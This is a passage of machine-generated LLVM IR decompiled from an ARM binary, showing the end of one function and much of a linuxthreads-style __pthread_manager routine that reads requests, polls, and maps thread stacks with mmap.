  store i32 %v2_b160, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  call void @__pseudo_cond_branch(i1 true, i32 ptrtoint ([3 x i8]* @global_var_b090.217 to i32))
  br label %dec_label_pc_b170

dec_label_pc_b170:                                ; preds = %dec_label_pc_b14c, %dec_label_pc_b15c
  %v2_b170 = load i32, i32* %stack_var_-16, align 4
  %v1_b174 = urem i32 %v2_b170, 128
  %v1_b178 = mul nuw nsw i32 %v1_b174, 16777216
  %v3_b17c = add nuw i32 %v1_b178, 16777216
  %v3_b180 = sdiv i32 %v3_b17c, 33554432
  store i32 %v3_b180, i32* %r3.global-to-local, align 4
  %v3_b17c.off = add nuw i32 %v1_b178, 50331647
  %tmp = icmp ult i32 %v3_b17c.off, 67108863
  store i1 %tmp, i1* %cpsr_z.global-to-local, align 1
  %tmp12 = icmp slt i32 %v3_b17c, 33554432
  br i1 %tmp12, label %dec_label_pc_b19c, label %dec_label_pc_b18c

dec_label_pc_b18c:                                ; preds = %dec_label_pc_b170
  %v2_b190 = call i32 @pthread_kill_all_threads(i32 %v1_b174, i32 1)
  %v1_b198 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_b19c:                                ; preds = %dec_label_pc_b170, %entry
  store i32 -2147483647, i32* %r2.global-to-local, align 4
  %v3_b1a8 = call i32 @__libc_waitpid(i32 -1, i32 %v2_b098, i32 -2147483647)
  %v2_b1ac = icmp eq i32 %v3_b1a8, 0
  store i1 %v2_b1ac, i1* %cpsr_z.global-to-local, align 1
  %v5_b1b0 = icmp sgt i32 %v3_b1a8, 0
  br i1 %v5_b1b0, label %dec_label_pc_b0a0, label %dec_label_pc_b1b4

dec_label_pc_b1b4:                                ; preds = %dec_label_pc_b19c
  store i32 %v3_b094, i32* @r4, align 4
  store i32 %v6_b094, i32* @r5, align 4
  ret i32 %v3_b1a8

; uselistorder directives
  uselistorder i32 %v3_b1a8, { 0, 2, 3, 1 }
  uselistorder i32 %v1_b174, { 1, 0 }
  uselistorder i32 %v0_b0c0, { 3, 4, 2, 1, 0 }
  uselistorder i32 %v0_b114, { 1, 0 }
  uselistorder i32 %v2_b0b8, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 3, 0, 1, 2 }
  uselistorder i1* %cpsr_z.global-to-local, { 7, 0, 1, 2, 8, 3, 4, 5, 6, 9 }
  uselistorder label %dec_label_pc_b170, { 1, 0 }
  uselistorder label %dec_label_pc_b14c, { 0, 2, 1 }
  uselistorder label %dec_label_pc_b120, { 2, 0, 1 }
}

define i32 @__pthread_manager(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp46 = call i32 @__decompiler_undefined_function_0()
  %tmp48 = call i32 @__decompiler_undefined_function_0()
  %tmp49 = call i32 @__decompiler_undefined_function_0()
  %tmp50 = call i8 @__decompiler_undefined_function_2()
  %stack_var_-264 = alloca i32, align 4
  %tmp55 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_2a5c0.184 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2a610.219 to i32), i32* %r2.global-to-local, align 4
  %v2_b1d8 = ptrtoint i32* %stack_var_-136 to i32
  store i32 %v2_b1d8, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_2a608.220 to i32), i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2a610.219 to i32), i32* @global_var_2a60c.221, align 4
  store i32 ptrtoint (i32* @global_var_2a608.220 to i32), i32* bitcast (i32** @global_var_2a604.222 to i32*), align 4
  store i32 %v2_b1d8, i32* @r0, align 4
  %v5_b1f0 = call i32 @sigfillset(i32 %v2_b1d8, i32 ptrtoint (i32* @global_var_2a608.220 to i32), i32 ptrtoint (i32* @global_var_2a610.219 to i32), i32 ptrtoint (i32* @global_var_2a5c0.184 to i32), i32 %arg1)
  store i32 ptrtoint (i32* @global_var_2a7ac.224 to i32), i32* %r3.global-to-local, align 4
  store i32 %v2_b1d8, i32* @r0, align 4
  %v2_b1fc = load i32, i32* @global_var_2a7ac.224, align 4
  store i32 %v2_b1fc, i32* %r1.global-to-local, align 4
  %v1_b200 = call i32 @__GI_sigdelset(i32 %v2_b1d8)
  store i32 %v2_b1d8, i32* @r0, align 4
  store i32 5, i32* %r1.global-to-local, align 4
  %v1_b20c = call i32 @__GI_sigdelset(i32 %v2_b1d8)
  store i32 %v1_b20c, i32* %r0.global-to-local, align 4
  %v2_b214 = load i32, i32* @global_var_2f568.200, align 4
  store i32 %v2_b214, i32* %r3.global-to-local, align 4
  %v2_b218 = icmp eq i32 %v2_b214, 0
  store i1 %v2_b218, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b218, label %dec_label_pc_b234, label %dec_label_pc_b220

dec_label_pc_b220:                                ; preds = %entry
  store i32 ptrtoint (i32* @global_var_2a7b0.202 to i32), i32* %r3.global-to-local, align 4
  %v2_b224 = load i32, i32* @global_var_2a7b0.202, align 4
  store i32 %v2_b224, i32* %r1.global-to-local, align 4
  %v2_b228 = icmp eq i32 %v2_b224, 0
  store i1 %v2_b228, i1* %cpsr_z.global-to-local, align 1
  %tmp60 = icmp slt i32 %v2_b224, 1
  br i1 %tmp60, label %bb61, label %bb

bb:                                               ; preds = %dec_label_pc_b220
  store i32 %v2_b1d8, i32* %r0.global-to-local, align 4
  br label %bb61

bb61:                                             ; preds = %dec_label_pc_b220, %bb
  %v5_b230 = icmp sgt i32 %v2_b224, 0
  call void @__pseudo_cond_branch(i1 %v5_b230, i32 ptrtoint (i32* @global_var_131cc.227 to i32))
  br label %dec_label_pc_b234

dec_label_pc_b234:                                ; preds = %entry, %bb61
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 %v2_b1d8, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_b240 = bitcast i32* %stack_var_-136 to %_TYPEDEF_sigset_t*
  %v4_b240 = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_b240, i32 0)
  %v2_b248 = load i32, i32* bitcast (i32** @global_var_2a7a0.197 to i32*), align 4
  store i32 %v2_b248, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_d688.230 to i32), i32* %r0.global-to-local, align 4
  %v1_b250 = call i32 @__pthread_manager_adjust_prio(i32 ptrtoint (i32* @global_var_d688.230 to i32))
  store i32 %v1_b250, i32* %r0.global-to-local, align 4
  %v2_b258 = ptrtoint i32* %stack_var_-284 to i32
  br label %dec_label_pc_b254

dec_label_pc_b254:                                ; preds = %dec_label_pc_b26c, %dec_label_pc_b234
  store i32 %arg1, i32* @r0, align 4
  store i32 %v2_b258, i32* @r1, align 4
  store i32 148, i32* @r2, align 4
  %v1_b260 = call i32 @__libc_read(i32 %arg1)
  store i32 %v1_b260, i32* %r0.global-to-local, align 4
  %v3_b264 = icmp eq i32 %v1_b260, -1
  %v8_b264 = icmp eq i32 %v1_b260, -1
  store i1 %v8_b264, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_b264, label %dec_label_pc_b26c, label %dec_label_pc_b27c

dec_label_pc_b26c:                                ; preds = %dec_label_pc_b254
  %v0_b26c = call i32 @__errno_location()
  store i32 %v0_b26c, i32* %r0.global-to-local, align 4
  %v1_b270 = inttoptr i32 %v0_b26c to i32*
  %v2_b270 = load i32, i32* %v1_b270, align 4
  store i32 %v2_b270, i32* %r3.global-to-local, align 4
  %v7_b274 = icmp eq i32 %v2_b270, 4
  store i1 %v7_b274, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_b274, label %dec_label_pc_b254, label %dec_label_pc_b27c

dec_label_pc_b27c:                                ; preds = %dec_label_pc_b254, %dec_label_pc_b26c
  store i32 %arg1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* %stack_var_-8, align 4
  %v2_b29c = ptrtoint i32* %stack_var_-8 to i32
  %v3_b2a0 = bitcast i32* %stack_var_-8 to %pollfd*
  %v4_b2e4 = zext i8 %tmp50 to i32
  %tmp = urem i8 %tmp50, 2
  %v2_b2e8 = icmp eq i8 %tmp, 0
  %v7_b304 = icmp eq i32 %tmp49, 5
  %v2_b5f4 = ptrtoint i32* %stack_var_-264 to i32
  %v3_b798 = urem i32 %tmp48, 1024
  %v4_b79c = mul nuw nsw i32 %v3_b798, 16
  %v5_b79c = add i32 %v4_b79c, ptrtoint (i32* @global_var_263c0.205 to i32)
  br label %dec_label_pc_b294

dec_label_pc_b294:                                ; preds = %.thread, %dec_label_pc_b2f0, %dec_label_pc_b8b4, %dec_label_pc_b8a4, %dec_label_pc_b2e4, %dec_label_pc_b8c4, %dec_label_pc_b898, %dec_label_pc_b7ec, %dec_label_pc_b7d8, %dec_label_pc_b890, %dec_label_pc_b27c
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 2000, i32* %r2.global-to-local, align 4
  store i32 %v2_b29c, i32* %r0.global-to-local, align 4
  %v4_b2a0 = call i32 @__libc_poll(%pollfd* %v3_b2a0, i32 1, i32 2000)
  store i32 %v4_b2a0, i32* %r0.global-to-local, align 4
  store i32 %v4_b2a0, i32* @r4, align 4
  %v0_b2a8 = call i32 @getppid()
  store i32 %v0_b2a8, i32* %r0.global-to-local, align 4
  %v7_b2ac = icmp eq i32 %v0_b2a8, 1
  store i1 %v7_b2ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_b2ac, label %dec_label_pc_b2b4, label %dec_label_pc_b2c4

dec_label_pc_b2b4:                                ; preds = %dec_label_pc_b294
  store i32 9, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_b2bc = call i32 @pthread_kill_all_threads(i32 9, i32 0)
  br label %dec_label_pc_b864

dec_label_pc_b2c4:                                ; preds = %dec_label_pc_b294
  store i32 ptrtoint (i32* @global_var_2b030.191 to i32), i32* %r2.global-to-local, align 4
  %v2_b2c8 = load i32, i32* @global_var_2b030.191, align 4
  store i32 %v2_b2c8, i32* %r3.global-to-local, align 4
  %v2_b2cc = icmp eq i32 %v2_b2c8, 0
  store i1 %v2_b2cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b2cc, label %.thread, label %bb62

bb62:                                             ; preds = %dec_label_pc_b2c4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* @global_var_2b030.191, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_b2c4, %bb62
  %v1_b2d8 = xor i1 %v2_b2cc, true
  call void @__pseudo_cond_branch(i1 %v1_b2d8, i32 ptrtoint (i32* @global_var_b094.232 to i32))
  %v0_b2dc = load i32, i32* @r4, align 4
  %v7_b2dc = icmp eq i32 %v0_b2dc, 1
  store i1 %v7_b2dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_b2dc, label %dec_label_pc_b2e4, label %dec_label_pc_b294

dec_label_pc_b2e4:                                ; preds = %.thread
  store i32 %v4_b2e4, i32* %r3.global-to-local, align 4
  store i1 %v2_b2e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b2e8, label %dec_label_pc_b294, label %dec_label_pc_b2f0

dec_label_pc_b2f0:                                ; preds = %dec_label_pc_b2e4
  store i32 %arg1, i32* @r0, align 4
  store i32 %v2_b258, i32* @r1, align 4
  store i32 148, i32* @r2, align 4
  %v1_b2fc = call i32 @__libc_read(i32 %arg1)
  store i32 %v1_b2fc, i32* %r0.global-to-local, align 4
  store i32 %tmp49, i32* %r3.global-to-local, align 4
  store i1 %v7_b304, i1* %cpsr_z.global-to-local, align 1
  switch i32 %tmp49, label %dec_label_pc_b294 [
    i32 0, label %dec_label_pc_b328
    i32 1, label %dec_label_pc_b78c
    i32 2, label %dec_label_pc_b7f8
    i32 3, label %dec_label_pc_b86c
    i32 4, label %dec_label_pc_b898
    i32 5, label %dec_label_pc_b8a4
  ]

dec_label_pc_b328:                                ; preds = %dec_label_pc_b2f0
  %v3_b328 = load i32, i32* %stack_var_-284, align 4
  store i32 %v3_b328, i32* %r2.global-to-local, align 4
  store i32 %tmp48, i32* %sl.global-to-local, align 4
  %v0_b334 = call i32 @__GI_getpagesize()
  store i32 %v0_b334, i32* @r0, align 4
  store i32 %v3_b328, i32* %r1.global-to-local, align 4
  store i32 %v3_b328, i32* %r2.global-to-local, align 4
  store i32 %tmp55, i32* %r3.global-to-local, align 4
  store i32 %tmp46, i32* %ip.global-to-local, align 4
  %v1_b348 = add i32 %v3_b328, 20
  %v2_b348 = inttoptr i32 %v1_b348 to i32*
  %v3_b348 = load i32, i32* %v2_b348, align 4
  store i32 %v3_b348, i32* %r1.global-to-local, align 4
  %v1_b34c = add i32 %v3_b328, 412
  %v2_b34c = inttoptr i32 %v1_b34c to i32*
  %v3_b34c = load i32, i32* %v2_b34c, align 4
  store i32 %v3_b34c, i32* %r2.global-to-local, align 4
  %v0_b350 = load i32, i32* %sl.global-to-local, align 4
  %v2_b350 = icmp eq i32 %v0_b350, 0
  store i1 %v2_b350, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_b334, i32* @r8, align 4
  br i1 %v2_b350, label %dec_label_pc_b39c.lr.ph, label %dec_label_pc_b36c

dec_label_pc_b36c:                                ; preds = %dec_label_pc_b328
  %v1_b36c = add i32 %v0_b350, 4
  %v2_b36c = inttoptr i32 %v1_b36c to i32*
  %v3_b36c = load i32, i32* %v2_b36c, align 4
  store i32 %v3_b36c, i32* %r3.global-to-local, align 4
  %v2_b370 = icmp eq i32 %v3_b36c, 0
  store i1 %v2_b370, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b370, label %dec_label_pc_b39c.lr.ph, label %dec_label_pc_b378

dec_label_pc_b378:                                ; preds = %dec_label_pc_b36c
  %v0_b378 = call i32 @geteuid()
  store i32 %v0_b378, i32* %r0.global-to-local, align 4
  %v2_b37c = icmp eq i32 %v0_b378, 0
  store i1 %v2_b37c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b37c, label %dec_label_pc_b39c.lr.ph, label %bb63

bb63:                                             ; preds = %dec_label_pc_b378
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b77c

dec_label_pc_b39c.lr.ph:                          ; preds = %dec_label_pc_b328, %dec_label_pc_b36c, %dec_label_pc_b378
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 2, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_b39c

dec_label_pc_b39c:                                ; preds = %dec_label_pc_b39c.lr.ph, %dec_label_pc_b4c8
  %v1_b3a0 = phi i32 [ 2, %dec_label_pc_b39c.lr.ph ], [ %v1_b4cc, %dec_label_pc_b4c8 ]
  %v4_b3a0 = mul nuw nsw i32 %v1_b3a0, 16
  %v5_b3a0 = add i32 %v4_b3a0, ptrtoint (i32* @global_var_263c0.205 to i32)
  store i32 %v5_b3a0, i32* %r3.global-to-local, align 4
  %v1_b3a4 = add i32 %v4_b3a0, add (i32 ptrtoint (i32* @global_var_263c0.205 to i32), i32 8)
  %v2_b3a4 = inttoptr i32 %v1_b3a4 to i32*
  %v3_b3a4 = load i32, i32* %v2_b3a4, align 4
  store i32 %v3_b3a4, i32* %r0.global-to-local, align 4
  %v2_b3a8 = icmp eq i32 %v3_b3a4, 0
  store i1 %v2_b3a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b3a8, label %dec_label_pc_b3b0, label %dec_label_pc_b4c8

dec_label_pc_b3b0:                                ; preds = %dec_label_pc_b39c
  store i32 ptrtoint (i32* @global_var_2b16c.177 to i32), i32* %r3.global-to-local, align 4
  %v0_b3b4 = load i32, i32* %sl.global-to-local, align 4
  %v2_b3b4 = icmp eq i32 %v0_b3b4, 0
  store i1 %v2_b3b4, i1* %cpsr_z.global-to-local, align 1
  %v2_b3b8 = load i32, i32* @global_var_2b16c.177, align 4
  br i1 %v2_b3b4, label %dec_label_pc_b3f8, label %dec_label_pc_b3c0

dec_label_pc_b3c0:                                ; preds = %dec_label_pc_b3b0
  %v1_b3c0 = add i32 %v0_b3b4, 24
  %v2_b3c0 = inttoptr i32 %v1_b3c0 to i32*
  %v3_b3c0 = load i32, i32* %v2_b3c0, align 4
  store i32 %v3_b3c0, i32* %r3.global-to-local, align 4
  %v2_b3c4 = icmp eq i32 %v3_b3c0, 0
  store i1 %v2_b3c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b3c4, label %dec_label_pc_b3f8, label %dec_label_pc_b3cc

dec_label_pc_b3cc:                                ; preds = %dec_label_pc_b3c0
  %v1_b3cc = add i32 %v0_b3b4, 28
  %v2_b3cc = inttoptr i32 %v1_b3cc to i32*
  %v3_b3cc = load i32, i32* %v2_b3cc, align 4
  store i32 %v3_b3cc, i32* %r2.global-to-local, align 4
  %v1_b3d0 = add i32 %v0_b3b4, 32
  %v2_b3d0 = inttoptr i32 %v1_b3d0 to i32*
  %v3_b3d0 = load i32, i32* %v2_b3d0, align 4
  store i32 %v3_b3d0, i32* %r1.global-to-local, align 4
  %v1_b3d437 = add i32 %v3_b3cc, -480
  %v1_b3d8 = and i32 %v1_b3d437, -4
  store i32 %v1_b3d8, i32* @r6, align 4
  store i32 ptrtoint (i32* @global_var_2f558.186 to i32), i32* %r3.global-to-local, align 4
  %v2_b3e0 = sub i32 %v3_b3cc, %v3_b3d0
  store i32 %v2_b3e0, i32* %fp.global-to-local, align 4
  store i32 0, i32* %sb.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* @global_var_2f558.186, align 4
  br label %dec_label_pc_b4d8

dec_label_pc_b3f8:                                ; preds = %dec_label_pc_b3c0, %dec_label_pc_b3b0
  store i1 %v2_b3b4, i1* %cpsr_z.global-to-local, align 1
  %v0_b3fc = load i32, i32* @r8, align 4
  %v1_b3fc = sub i32 2097152, %v0_b3fc
  store i32 %v1_b3fc, i32* @r5, align 4
  br i1 %v2_b3b4, label %dec_label_pc_b428, label %dec_label_pc_b404

dec_label_pc_b404:                                ; preds = %dec_label_pc_b3f8
  %v1_b404 = add i32 %v0_b3b4, 32
  %v2_b404 = inttoptr i32 %v1_b404 to i32*
  %v3_b404 = load i32, i32* %v2_b404, align 4
  %v2_b408 = add i32 %v0_b3fc, -1
  %v1_b40c = add i32 %v2_b408, %v3_b404
  store i32 %v0_b3fc, i32* %r1.global-to-local, align 4
  %v2_b414 = udiv i32 %v1_b40c, %v0_b3fc
  store i32 %v2_b414, i32* %r0.global-to-local, align 4
  %v2_b418 = mul i32 %v2_b414, %v0_b3fc
  store i32 %v2_b418, i32* %r3.global-to-local, align 4
  %v3_b41c = icmp ult i32 %v1_b3fc, %v2_b418
  %v9_b41c = icmp eq i32 %v1_b3fc, %v2_b418
  store i1 %v9_b41c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_b41c, label %dec_label_pc_b428, label %dec_label_pc_b42c

dec_label_pc_b428:                                ; preds = %dec_label_pc_b404, %dec_label_pc_b3f8
  br label %dec_label_pc_b42c

dec_label_pc_b42c:                                ; preds = %dec_label_pc_b404, %dec_label_pc_b428
  %storemerge38 = phi i32 [ %v1_b3fc, %dec_label_pc_b428 ], [ %v2_b418, %dec_label_pc_b404 ]
  store i32 %storemerge38, i32* @r4, align 4
  %v3_b434 = mul nsw i32 %v1_b3a0, -2097152
  %v2_b440 = load i32, i32* @global_var_2f3e8.239, align 4
  %v4_b434 = or i32 %v3_b434, 2096672
  %v2_b444 = add i32 %v4_b434, %v2_b3b8
  store i32 %v2_b444, i32* @r6, align 4
  %v3_b448 = mul i32 %v2_b440, 4
  store i32 %v3_b448, i32* %r1.global-to-local, align 4
  %v2_b44c = sub i32 %v2_b444, %v3_b448
  store i32 -1, i32* %ip.global-to-local, align 4
  %v1_b454 = add i32 %v2_b44c, 480
  store i32 %v1_b454, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r7, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 306, i32* %r3.global-to-local, align 4
  %v6_b46c = call i32 @mmap(i32 %v1_b454, i32 %v3_b448, i32 7, i32 306, i32 -1, i32 0)
  store i32 %v6_b46c, i32* %r0.global-to-local, align 4
  %v7_b470 = icmp eq i32 %v6_b46c, -1
  store i1 %v7_b470, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_b470, label %dec_label_pc_b4c8, label %dec_label_pc_b478

dec_label_pc_b478:                                ; preds = %dec_label_pc_b42c
  %v0_b478 = load i32, i32* @r4, align 4
  %v1_b478 = load i32, i32* @r6, align 4
  %v2_b478 = sub i32 %v1_b478, %v0_b478
  store i32 %v2_b478, i32* %r3.global-to-local, align 4
  %v1_b47c = load i32, i32* @r5, align 4
  %v9_b47c = icmp eq i32 %v0_b478, %v1_b47c
  store i1 %v9_b47c, i1* %cpsr_z.global-to-local, align 1
  %v1_b480 = add i32 %v2_b478, 480
  store i32 %v1_b480, i32* %fp.global-to-local, align 4
  br i1 %v9_b47c, label %dec_label_pc_b4bc, label %dec_label_pc_b488

dec_label_pc_b488:                                ; preds = %dec_label_pc_b478
  %v0_b488 = load i32, i32* %sl.global-to-local, align 4
  %v1_b488 = add i32 %v0_b488, 20
  %v2_b488 = inttoptr i32 %v1_b488 to i32*
  %v3_b488 = load i32, i32* %v2_b488, align 4
  store i32 %v3_b488, i32* %sb.global-to-local, align 4
  %v2_b48c = sub i32 %v1_b480, %v3_b488
  store i32 %v2_b48c, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  store i32 %v3_b488, i32* %r1.global-to-local, align 4
  %v0_b4a0 = load i32, i32* @r7, align 4
  store i32 %v0_b4a0, i32* %r2.global-to-local, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  %v6_b4b0 = call i32 @mmap(i32 %v2_b48c, i32 %v3_b488, i32 %v0_b4a0, i32 16, i32 -1, i32 %v0_b4a0)
  store i32 %v6_b4b0, i32* %r0.global-to-local, align 4
  %v3_b4b4 = icmp eq i32 %v6_b4b0, -1
  %v8_b4b4 = icmp eq i32 %v6_b4b0, -1
  store i1 %v8_b4b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_b4b4, label %dec_label_pc_b4bc, label %dec_label_pc_b4d8

dec_label_pc_b4bc:                                ; preds = %dec_label_pc_b488, %dec_label_pc_b478
  %v0_b4bc = load i32, i32* @r7, align 4
  store i32 %v0_b4bc, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_b4d8

dec_label_pc_b4c8:                                ; preds = %dec_label_pc_b39c, %dec_label_pc_b42c
  %v1_b4cc = add nuw nsw i32 %v1_b3a0, 1
  store i32 %v1_b4cc, i32* %r1.global-to-local, align 4
  store i32 %v1_b4cc, i32* %ip.global-to-local, align 4
  %v2_b394 = icmp ugt i32 %v1_b4cc, 1023
  %v7_b394 = icmp eq i32 %v1_b4cc, 1024
  store i1 %v7_b394, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b394, label %dec_label_pc_b760, label %dec_label_pc_b39c

dec_label_pc_b4d8:                                ; preds = %dec_label_pc_b488, %dec_label_pc_b4bc, %dec_label_pc_b3cc
  %stack_var_-312.0 = phi i32 [ %v0_b4bc, %dec_label_pc_b4bc ], [ %v2_b48c, %dec_label_pc_b488 ], [ 0, %dec_label_pc_b3cc ]
  %v0_b4d8 = load i32, i32* @r6, align 4
  store i32 %v0_b4d8, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  store i32 480, i32* @r2, align 4
  %v0_b4e4 = call i32 @__GI_memset()
  store i32 ptrtoint (i32* @global_var_2b038.243 to i32), i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_2a3c0.207 to i32), i32* @r4, align 4
  %v2_b4f0 = load i32, i32* @global_var_2b038.243, align 4
  store i32 %v1_b3a0, i32* %ip.global-to-local, align 4
  %v2_b4f8 = load i32, i32* @global_var_2a3c0.207, align 4
  %v1_b4fc = add i32 %v2_b4f0, 1024
  %v2_b500 = add i32 %v1_b4fc, %v1_b3a0
  %v0_b504 = load i32, i32* @r6, align 4
  store i32 %v0_b504, i32* @r8, align 4
  %v1_b50c = add i32 %v2_b4f8, 1
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v1_b50c, i32* @global_var_2a3c0.207, align 4
  store i32 %v1_b4fc, i32* @global_var_2b038.243, align 4
  store i32 %stack_var_-312.0, i32* %r2.global-to-local, align 4
  %v3_b520 = add i32 %v0_b504, 64
  %v4_b520 = inttoptr i32 %v3_b520 to i8*
  store i8 0, i8* %v4_b520, align 1
  %v0_b524 = load i32, i32* %r1.global-to-local, align 4
  %v1_b524 = trunc i32 %v0_b524 to i8
  %v2_b524 = load i32, i32* @r8, align 4
  %v3_b524 = add i32 %v2_b524, 65
  %v4_b524 = inttoptr i32 %v3_b524 to i8*
  store i8 %v1_b524, i8* %v4_b524, align 1
  %v0_b528 = load i32, i32* %ip.global-to-local, align 4
  %v3_b528 = mul i32 %v0_b528, 16
  store i32 %v3_b528, i32* @r6, align 4
  store i32 ptrtoint (i32* @global_var_263c0.205 to i32), i32* @r7, align 4
  %v0_b530 = load i32, i32* @r8, align 4
  %v1_b530 = add i32 %v0_b530, 72
  store i32 %v2_b500, i32* %r3.global-to-local, align 4
  %v2_b538 = add i32 %v0_b530, 68
  %v3_b538 = inttoptr i32 %v2_b538 to i32*
  store i32 %v1_b530, i32* %v3_b538, align 4
  store i32 %v1_b3a0, i32* %ip.global-to-local, align 4
  %v0_b540 = load i32, i32* @r6, align 4
  %v1_b540 = load i32, i32* @r7, align 4
  %v2_b540 = add i32 %v1_b540, %v0_b540
  store i32 %v2_b540, i32* %r0.global-to-local, align 4
  %v0_b544 = load i32, i32* %r3.global-to-local, align 4
  %v1_b544 = load i32, i32* @r8, align 4
  %v2_b544 = add i32 %v1_b544, 16
  %v3_b544 = inttoptr i32 %v2_b544 to i32*
  store i32 %v0_b544, i32* %v3_b544, align 4
  %v0_b548 = load i32, i32* @r8, align 4
  %v1_b548 = add i32 %v0_b548, 80
  store i32 %v1_b548, i32* @lr, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_b550 = load i32, i32* %sl.global-to-local, align 4
  %v2_b550 = icmp eq i32 %v0_b550, 0
  store i1 %v2_b550, i1* %cpsr_z.global-to-local, align 1
  %v0_b554 = load i32, i32* %sb.global-to-local, align 4
  %v2_b554 = add i32 %v0_b548, 400
  %v3_b554 = inttoptr i32 %v2_b554 to i32*
  store i32 %v0_b554, i32* %v3_b554, align 4
  %v0_b558 = load i32, i32* @r8, align 4
  %v2_b558 = add i32 %v0_b558, 404
  %v3_b558 = inttoptr i32 %v2_b558 to i32*
  store i32 %v0_b558, i32* %v3_b558, align 4
  %v0_b55c = load i32, i32* %ip.global-to-local, align 4
  %v1_b55c = load i32, i32* @r8, align 4
  %v2_b55c = add i32 %v1_b55c, 408
  %v3_b55c = inttoptr i32 %v2_b55c to i32*
  store i32 %v0_b55c, i32* %v3_b55c, align 4
  %v0_b560 = load i32, i32* @lr, align 4
  %v1_b560 = load i32, i32* @r8, align 4
  %v2_b560 = add i32 %v1_b560, 76
  %v3_b560 = inttoptr i32 %v2_b560 to i32*
  store i32 %v0_b560, i32* %v3_b560, align 4
  %v0_b564 = load i32, i32* %r1.global-to-local, align 4
  %v1_b564 = load i32, i32* %r0.global-to-local, align 4
  %v2_b564 = add i32 %v1_b564, 4
  %v3_b564 = inttoptr i32 %v2_b564 to i32*
  store i32 %v0_b564, i32* %v3_b564, align 4
  %v0_b568 = load i32, i32* %r2.global-to-local, align 4
  %v1_b568 = load i32, i32* @r8, align 4
  %v2_b568 = add i32 %v1_b568, 396
  %v3_b568 = inttoptr i32 %v2_b568 to i32*
  store i32 %v0_b568, i32* %v3_b568, align 4
  %v0_b56c = load i32, i32* %fp.global-to-local, align 4
  %v1_b56c = load i32, i32* %r0.global-to-local, align 4
  %v2_b56c = add i32 %v1_b56c, 12
  %v3_b56c = inttoptr i32 %v2_b56c to i32*
  store i32 %v0_b56c, i32* %v3_b56c, align 4
  %v0_b570 = load i32, i32* %r1.global-to-local, align 4
  %v1_b570 = load i32, i32* @r6, align 4
  %v2_b570 = load i32, i32* @r7, align 4
  %v3_b570 = add i32 %v2_b570, %v1_b570
  %v4_b570 = inttoptr i32 %v3_b570 to i32*
  store i32 %v0_b570, i32* %v4_b570, align 4
  %v0_b574 = load i32, i32* %r3.global-to-local, align 4
  %v1_b574 = load i32, i32* @r8, align 4
  %v2_b574 = add i32 %v1_b574, 228
  %v3_b574 = inttoptr i32 %v2_b574 to i32*
  store i32 %v0_b574, i32* %v3_b574, align 4
  %v0_b578 = load i32, i32* %r0.global-to-local, align 4
  %v1_b578 = load i32, i32* @r8, align 4
  %v2_b578 = add i32 %v1_b578, 28
  %v3_b578 = inttoptr i32 %v2_b578 to i32*
  store i32 %v0_b578, i32* %v3_b578, align 4
  %v0_b57c = load i32, i32* @r8, align 4
  %v1_b57c = load i32, i32* %r0.global-to-local, align 4
  %v2_b57c = add i32 %v1_b57c, 8
  %v3_b57c = inttoptr i32 %v2_b57c to i32*
  store i32 %v0_b57c, i32* %v3_b57c, align 4
